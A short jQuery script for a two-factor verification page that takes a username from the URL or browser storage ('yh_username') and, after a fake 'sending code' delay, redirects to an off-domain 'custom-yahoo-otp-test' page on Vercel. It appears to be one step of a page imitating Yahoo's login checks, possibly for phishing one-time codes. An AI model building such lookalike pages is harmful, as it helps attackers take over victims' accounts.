// Import jQuery
const $ = require("jquery")

$(document).ready(() => {
  console.log("2FA verification page initialized")

  let selectedMethod = "sms"

  // Handle verification method selection
  $(".verification-option").click(function () {
    $(".verification-option").removeClass("selected")
    $(this).addClass("selected")
    selectedMethod = $(this).data("method")
    $("#challenge").val(selectedMethod)
    console.log("Selected method:", selectedMethod)
  })

  // Set default selection
  $('.verification-option[data-method="sms"]').addClass("selected")

  // Handle form submission
  $("#challenge-form").on("submit", (e) => {
    e.preventDefault()

    console.log("Submitting 2FA challenge:", selectedMethod)
    $("#main-form").hide()
    $("#loading-state").show()

    // Simulate sending code and redirect to OTP page
    setTimeout(() => {
      window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
    }, 2000)

    return false
  })

  // Get username from URL or storage
  function getUsername() {
    const urlParams = new URLSearchParams(window.location.search)
    let user = urlParams.get("u")

    if (user) {
      return decodeURIComponent(user)
    }

    user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
    if (user) {
      return user
    }

    return "your account"
  }

  // Initialize page
  const username = getUsername()
  $("#userEmail").text(username)
  $("#username").val(username)

  console.log("2FA page ready for user:", username)
})
